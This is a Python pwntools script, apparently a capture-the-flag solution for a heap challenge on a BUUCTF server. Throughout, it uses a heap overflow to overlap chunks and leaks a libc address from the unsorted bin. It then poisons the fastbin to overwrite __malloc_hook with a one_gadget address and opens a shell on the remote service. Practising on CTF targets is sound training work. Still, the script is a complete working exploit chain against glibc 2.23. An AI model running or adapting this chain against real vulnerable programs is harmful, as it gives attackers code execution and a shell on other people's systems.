from pwn import *

context.arch = 'amd64'

p = remote('node4.buuoj.cn', 25944)

libc = ELF('../../libc/libc-2.23.so')


def allocate(_size):
    p.sendlineafter(': ', '1')
    p.sendlineafter(': ', str(_size))


def edit(index, _size, content):
    p.sendlineafter(': ', '2')
    p.sendlineafter(': ', str(index))
    p.sendlineafter(': ', str(_size))
    p.sendafter(': ', content)


def free(index):
    p.sendlineafter(': ', '3')
    p.sendlineafter(': ', str(index))


def dump(index):
    p.sendlineafter(': ', '4')
    p.sendlineafter(': ', str(index))
    p.recvline()


allocate(0x80)  # 0
allocate(0x80)  # 1
allocate(0x80)  # 2
allocate(0x60)  # 3
free(0)
edit(1, 0x90, b'a' * 0x80 + flat([0x120, 0x90]))
free(2)
allocate(0x80)  # 0
allocate(0x80)  # 2 <-> 1
allocate(0x80)  # 4
free(1)
dump(2)
libc.address = unpack(p.recv(6).ljust(8, b'\x00')) - 0x3C4B78
allocate(0x80)  # 1 <-> 2
free(3)
edit(4, 0x98, b'a' * 0x80 + flat([0, 0x71, libc.sym['__malloc_hook'] - 0x23]))
allocate(0x60)  # 3
allocate(0x60)  # 5
edit(5, 0x1B, b'\x00' * 0x13 + pack(libc.address + 0x4526a))
allocate(1337)
p.interactive()
